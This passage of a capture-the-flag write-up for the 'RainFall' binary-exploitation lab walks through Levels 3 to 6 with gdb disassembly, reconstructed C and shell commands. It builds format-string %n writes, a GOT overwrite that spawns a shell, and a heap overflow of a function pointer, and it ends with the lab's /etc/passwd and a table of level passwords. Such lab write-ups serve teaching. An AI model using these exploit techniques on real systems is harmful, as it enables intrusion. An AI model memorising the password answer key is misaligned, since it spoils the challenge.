level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x000000e4 in ?? ()

# For the 2nd byte (0x84 / 132): add 132 to (256 - 228)

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x000184e4 in ?? ()

# For the 3rd byte (0x04 / 4): add 4 to (256 - 132)

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%127x%6$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run </tmp/input
Starting program: /home/user/level3/level3 </tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x020384e4 in ?? ()

# For the 4th byte (0x08 / 8): add 4 to 256

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%128x%6$n''%260x%7$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input
\�]�^�_�                                                                                                                                                                                                                 200                                                                                                                                                        b7fd1ac0                                                                                                                        b7ff37d0                                                                                                                                                                                                                                                            bffff45cWait what?!
[Inferior 1 (process 28545) exited normally]
```

Yay! We hit the printf() call, but it didn't work, lets put directly the address before the system() call (`0x0804850c`)

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%252x%4$n''%121x%5$n''%127x%6$n''%260x%7$n' > /tmp/input

level3@RainFall:~$ cat /tmp/input  | ./level3
\�]�^�_�                                                                                                                                                                                                                                                         200                                                                                                                 b7fd1ac0                                                                                                                       b7ff37d0                                                                                                                                                                                                                                                            bffff45c
```

Todo: redact this

## Level4

- [`objdump -d` output](http://...)

### ASM Interpretation

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n> ; n()
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218 ; Allocate 0x218 (536) bytes on the stack
   0x08048460 <+9>:	mov    eax,ds:0x8049804 ; exa to stdout@libc
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set 3st argument of fgets() to stdout
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 2nd argument of fgets() to 512
   0x08048471 <+26>:	lea    eax,[ebp-0x208] ; Set 16th (520th last) byte of the stack to eax
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
   0x0804847a <+35>:	call   0x8048350 <fgets@plt> ; fgets(ebp[-0x208 / -520] / (16th last byte of the stack), 0x200 / 512, stdout);
   0x0804847f <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th (520th last) byte of the stack
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax ; Set eax as argument of p()
   0x08048488 <+49>:	call   0x8048444 <p> ; Call p(eax) / p(&stack[16])
   0x0804848d <+54>:	mov    eax,ds:0x8049810 ; printf "%u", *0x8049810 -> "0" ; // unsigned int m = 0;
   0x08048492 <+59>:	cmp    eax,0x1025544 ; compare eax with 0x1025544 / 16930116 in decimal
   0x08048497 <+64>:	jne    0x80484a5 <n+78> ; if not equal, goto return of the function
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590 ; (gdb) printf "%s", 0x8048590 -> "/bin/cat /home/user/level5/.pass"
   0x080484a0 <+73>:	call   0x8048360 <system@plt> ; call system("/bin/cat /home/user/level5/.pass")
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret

(gdb)disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the first argument passed to p()
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax ; Set eax to the 1st argument of printf()
   0x08048450 <+12>:	call   0x8048340 <printf@plt> ; call printf(eax)
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

### Equivalent C source code

```c
#include <stdio.h>

unsigned int m = 0;

void	p(void *fmt) {
	printf(fmt);
}

void	n(void) {
	unsigned char buffer[536];

	fgets(&buffer[16], 512, stdout);
	p(&buffer[16]);
	if (m == 16930116) {
		system("/bin/cat /home/user/level5/.pass");
	}
}

int		main(int ac, char **av) {
    n();
}

```

### Walkthrough

```bash
level4@RainFall:~$ python -c 'print "%x "*50' > /tmp/lol

level4@RainFall:~$ gdb ./level4
(gdb) run < /tmp/lol
b7ff26b0 bffff6d4 b7fd0ff4 [0 0] bffff698 804848d bffff490 200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 ....

# We can think our m global variable is one of these two zeros

level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%4$s' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
0000000: 4242 4242 286e 756c 6c29                 BBBB(null) # The program should segfault by reading the address 0x42424242 after printing BBBB


# Let's do a quick for to find the real offset of the string passed to p()
level4@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "BBBB%$i\$x" | ./level4; echo; done;) | grep 42424242
12: BBBB42424242

# Try again ...
level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%12$s' >  /tmp/lol ; cat /tmp/lol | ./level4
Segmentation fault (core dumped)


level4@RainFall:~$ echo -n -e '\x10\x98\x04\x08%12$n' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
0000000: 1098 0408                                ....

level4@RainFall:~$ gdb ./level4

(gdb) b *0x08048492
Breakpoint 1 at 0x8048492

(gdb) run < /tmp/lol
Starting program: /home/user/level4/level4 < /tmp/lol

Breakpoint 1, 0x08048492 in n ()
(gdb) printf "%u", *0x8049810
4

# The value of m got modified by the %n operator ! Now let's give it the value of the comparison (16930116) by printing 16930112 more characters
echo -n -e '\x10\x98\x04\x08%16930112x%12$n' >  /tmp/lol ; cat /tmp/lol - | ./level4
# Should print a lot of spaces .... and then
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Level5

- [`objdump -d` output](http://ix.io/2cFu)

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp

   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n> ; call n function

   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp

   0x080484c5 <+3>:	sub    esp,0x218 ; Allocate 0x218 bytes on the stack (528)
   0x080484cb <+9>:	mov    eax,ds:0x8049848 ; Set eax to stdin@@GLIBC_2.0
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set eax to 3rd argument of fgets()
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 512 to 2nd argument of fgets()
   0x080484dc <+26>:	lea    eax,[ebp-0x208] ; Set eax to 520th byte of the stack
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> ; Call fgets(&buffer[16], 512, stdin); (512 + 16) > 528 so a buffer overflow is possible ...
     ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
   0x080484ea <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th first byte of the stack
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax ; Set eax to 1st argument of printf()
   0x080484f3 <+49>:	call   0x8048380 <printf@plt> ; Call printf(eax) / printf(&buffer[16])
     ; int printf(const char * restrict format, ...);
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
   0x080484ff <+61>:	call   0x80483d0 <exit@plt> ; Call exit(1)
     ; void exit(int status);
End of assembler dump.

# If we look closely at the assembly code, we can find the o function, which is not called
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp

   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0 ; (gdb) printf "%s", 0x80485f0 -> "/bin/sh"
   0x080484b1 <+13>:	call   0x80483b0 <system@plt> ; Call system("/bin/sh");
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
   0x080484bd <+25>:	call   0x8048390 <_exit@plt> ; Call exit(1)
End of assembler dump.
```

### Equivalent C source code

```c
#include <stdio.h>

void	o(void) {
	system("/bin/sh");
	exit(1);
}

void	n(void) {
	unsigned char buffer[528];
	
	fgets(&buffer[16], 512, stdin);
	printf(&buffer[16]);
	exit(1);
}

int		main(int ac, char **av) {
	n();
	return 0;
}

# Compiled with -fpic
```

### Walktrough

```bash
# Find the index of the string
level5@RainFall:~$ (for i in {1..500}; do echo -n -e 'BBBB%'${i}'$x' > /tmp/lol ; echo -n $i": "; cat /tmp/lol2 | ./level5 ; echo ; done;) | grep 42424242
4: BBBB42424242

# Check if we can make the program segfault
level5@RainFall:~$ echo 'BBBB%4$s' | ./level5
Segmentation fault (core dumped)
```

#### Finding saved EIP address

To find the saved EIP of the program, we can use the ability to make the program segfault in cordination with gdb

- Make the program SEGV:

```bash
(gdb) run <<< 'BBBB%4$x'
Starting program: /home/user/level5/level5 <<< 'BBBB%4$x'
BBBB42424242
[Inferior 1 (process 12790) exited with code 01]
(gdb) run <<< 'BBBB%4$s'
Starting program: /home/user/level5/level5 <<< 'BBBB%4$s'

Program received signal SIGSEGV, Segmentation fault.
0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
```

- Once the program has received the segv signal, check the backtrace of the program

```bash
(gdb) bt
#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x080484f8 in n ()
#3  0x0804850f in main ()
```

- In our case, we want to modify the saved EIP of the n() function to avoid the exit() function call and instead jump into the o() function

- Use the `info frame` command with the index of the frame

```
(gdb) info  frame 1
Stack frame at 0xbffff480:
 eip = 0xb7e7887f in printf; saved eip 0x80484f8
 called by frame at 0xbffff6a0, caller of frame at 0xbffff460
 Arglist at 0xbffff460, args:
 Locals at 0xbffff460, Previous frame's sp is 0xbffff480
 Saved registers:
  ebx at 0xbffff478, eip at [0xbffff47c]

(gdb) info  frame 2
Stack frame at 0xbffff6a0:
 eip = 0x80484f8 in n; saved eip 0x804850f
 called by frame at 0xbffff6b0, caller of frame at 0xbffff480
 Arglist at 0xbffff698, args:
 Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
 Saved registers:
  ebp at 0xbffff698, [eip at 0xbffff69c]
```

- Try to overwrite the address of the saved EIP !

```bash
level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$s' | ./level5 | xxd
0000000: 7cf4 ffbf 7f88 e7b7 201a fdb7 b0f4 ffbf  |....... .......
0000010: a4f4 ffbf 5088 e7b7 b0f4 ffbf 18f9 ffb7  ....P...........
0000020: f40f fdb7 f884 0408 b0f4 ffbf            ............

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' | ./level5
Segmentation fault (core dumped)

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' > /tmp/lol

level5@RainFall:~$ gdb ./level5
(gdb) run < /tmp/lol
Starting program: /home/user/level5/level5 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%134513824$n' > /tmp/lol # Address of o() minus 4 first printed bytes

(gdb) run < /tmp/lol
The program being debugged has been started already.
Start it from the beginning? (y or n) yy
Starting program: /home/user/level5/level5 < /tmp/lol
|�[Inferior 1 (process 3572) exited with code 01]

```

This didn't worked ... maybe another solution is possible ? 

### Overwriting exit from PLT

- [GOT and PLT for pwning.
](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

- [How to Hijack the Global Offset Table with pointers
](https://www.exploit-db.com/papers/13203)

```bash
level5@RainFall:~$ objdump  -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

- We can see that the address of the exit syscall is located at the address `08049838` of our PLT table

```bash
level5@RainFall:~$ objdump  -d ./level5
...
080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
 80483d6:       68 28 00 00 00          push   $0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
...
```

```bash
(gdb) disas 0x8049838
Dump of assembler code for function exit@got.plt:
   0x08049838 <+0>:     (bad)
   0x08049839 <+1>:     add    DWORD PTR [eax+ecx*1],0xffffffe6
End of assembler dump.
```

- So when exit() is called, the function will jump to the address stored in this address, let's stry to overwrite it with the address of o()

```bash
level5@RainFall:~$ echo -n -e '\x38\x98\x04\x08%134513824x%4$n' > /tmp/lol

level5@RainFall:~$ cat /tmp/lol  - | ./level5
# Prints a lot of spaces
200ls
ls
ls: cannot open directory .: Permission denied
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Level6

- [`objdump -d` output](http://ix.io/2dwZ)

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp ; ASM Prologue
   0x0804847d <+1>:     mov    ebp,esp ; ASM Prologue

   0x0804847f <+3>:     and    esp,0xfffffff0 ; Align esp
   0x08048482 <+6>:     sub    esp,0x20 ; Allocate 0x20 / 32 bytes on the stack
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40 ; Move 0x40 / 64 to first argument of malloc()
   0x0804848c <+16>:    call   0x8048350 <malloc@plt> ; Call malloc(64)
     ; void *malloc(size_t size);
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax ; Set the 28th byte of the stack to eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4 ; Set 0x4 / 4 as 1st argument of malloc()
   0x0804849c <+32>:    call   0x8048350 <malloc@plt> ; Call malloc(4)
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax ; Set the 24th byte of the stack to eax
   0x080484a5 <+41>:    mov    edx,0x8048468 ; Set edx to the address of m()
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx ; Set eax to edx
   
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc] ; Set eax to 12 byte before the beginning of the stack
   0x080484b3 <+55>:    add    eax,0x4 ; Add 4 to eax
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax] ;
   0x080484b8 <+60>:    mov    edx,eax ; Set edx to eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx ; Set the 2nd argument of strcpy() to edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax ; Set the 1st argument of strcpy to eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt> ; Call strcpy(eax, edx)
     ; char *strcpy(char * dst, const char * src);
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax ; Call eax()
   0x080484d2 <+86>:    leave ; ASM Epilogue
   0x080484d3 <+87>:    ret ; ASM Epilogue
End of assembler dump.

(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp ; ASM Prologue
   0x08048469 <+1>:     mov    ebp,esp ; ASM Prologue
   0x0804846b <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1 ; printf "%s", 0x80485d1 -> "Nope"; Set the 1st argument of puts() to "Nope"
   0x08048475 <+13>:    call   0x8048360 <puts@plt> ; Call puts("Nope");
   0x0804847a <+18>:    leave ; ASM Epilogue
   0x0804847b <+19>:    ret ; ASM Epilogue
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp ; ASM Prologue
   0x08048455 <+1>:     mov    ebp,esp ; ASM Prologue
   0x08048457 <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0 ; printf "%s", 0x80485b0 -> "/bin/cat /home/user/level7/.pass" ; Set the 1st argument of system() to "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:    call   0x8048370 <system@plt> ; Call system("/bin/cat /home/user/level7/.pass")
   0x08048466 <+18>:    leave ; ASM Epilogue
   0x08048467 <+19>:    ret ; ASM Epilogue
End of assembler dump.
```

### Equivalent C source code



```c
#include <stdio.h>

void    n() {
        unsigned char buf[24];

        system("bin/cat /home/user/level7/.pass");
}

void    m() {
        unsigned char buf[24];

        puts("Nope");
}

int     main(int ac, char **av) {
        unsigned char   buf[32];

        (void *)(*(buf + 28)) = malloc(64);
        (void *)(*(buf + 24)) = malloc(4);
        (void *)(*(buf + 24)) = &m;
        strcpy(&buf[28], *(buf - 12) + 4);
        *(&buf[24])();
        return ;
}
```

### Walktrough

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 a
Nope
```

- As we can see the program segfaults when no arguments are passed we can know it uses argv[1]

```bash
level6@RainFall:~$ ./level6  $(python -c 'print "A"*71')
Nope

level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')
Segmentation fault (core dumped)

(gdb) run  $(python -c 'print "A"*72')
Starting program: /home/user/level6/level6 $(python -c 'print "A"*72')

Program received signal SIGSEGV, Segmentation fault.
0x08048408 in __do_global_dtors_aux ()
```

- It also segfaults when the 1st argument is longer than 71 bytes, it looks like the [73 to 76] bytes can be used to overwrite EIP

```bash
(gdb) run $(python -c 'print "A"*76')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level6/level6 $(python -c 'print "A"*76')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
---

level6@RainFall:~$ gdb ./level6
gdb$ run $(python -c 'print "A"*72+"B"*4')
Starting program: /home/user/level6/level6 $(python -c 'print "A"*72+"B"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

- Let's try with the address of n() instead (`0x08048454`)

```

level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')$(echo -n -e '\x54\x84\x04\x08')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Level7

- [`objdump -d` output](http://ix.io/2dxJ)

### ASM Interpretation

### Equivalent C source code

### Walktrough

## Misc / References

### ASM Cheatsheets

- [Registers usage](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html)
- [ASM Operations](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)
- [Linux Syscall Table](https://filippo.io/linux-syscall-table/)
- [Att vs Intel syntax](https://imada.sdu.dk/~kslarsen/Courses/dm546-2019-spring/Material/IntelnATT.htm)
- [Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)

![](https://www.tortall.net/projects/yasm/manual/html/objfmt-win64/calling-convention.png)

### ASM Returns

```asm
lea    eax,[ebp-0x4c]
```

![](https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb2.png?w=617&h=480)

### /etc/passwd content

```bash
level0@RainFall:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
level0:x:2020:2020::/home/user/level0:/bin/bash
level1:x:2030:2030::/home/user/level1:/bin/bash
level2:x:2021:2021::/home/user/level2:/bin/bash
level3:x:2022:2022::/home/user/level3:/bin/bash
level4:x:2025:2025::/home/user/level4:/bin/bash
level5:x:2045:2045::/home/user/level5:/bin/bash
level6:x:2064:2064::/home/user/level6:/bin/bash
level7:x:2024:2024::/home/user/level7:/bin/bash
level8:x:2008:2008::/home/user/level8:/bin/bash
level9:x:2009:2009::/home/user/level9:/bin/bash
bonus0:x:2010:2010::/home/user/bonus0:/bin/bash
bonus1:x:2011:2011::/home/user/bonus1:/bin/bash
bonus2:x:2012:2012::/home/user/bonus2:/bin/bash
bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
end:x:2014:2014::/home/user/end:/bin/bash
```

### Passwords

```bash
level0 -> level0
level1 -> 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
level2 -> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
level3 -> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
level7 -> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
